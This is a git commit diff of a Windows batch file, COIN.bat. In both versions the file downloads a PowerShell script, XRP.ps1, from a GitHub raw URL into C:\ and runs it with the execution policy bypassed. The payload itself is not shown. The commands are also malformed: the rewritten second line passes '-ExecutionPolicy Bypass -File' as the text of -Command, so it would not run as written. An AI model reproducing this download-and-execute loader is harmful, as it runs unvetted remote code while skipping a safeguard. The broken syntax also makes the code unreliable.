a346afe363ff83f67cbea0ff94821776e5e9ed80
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-01-10 11:03:17 +0700

    COIN.bat

--- COIN.bat
+++ COIN.bat
@@ -1,4 +1,4 @@
 @echo off
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRP.ps1" -OutFile "C:\XRP.ps1"
--ExecutionPolicy Bypass -File "C:\XRP.ps1"
+powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRP.ps1' -OutFile 'C:\XRP.ps1'"
+powershell -NoProfile -Command "-ExecutionPolicy Bypass -File 'C:\XRP.ps1'"
 exit
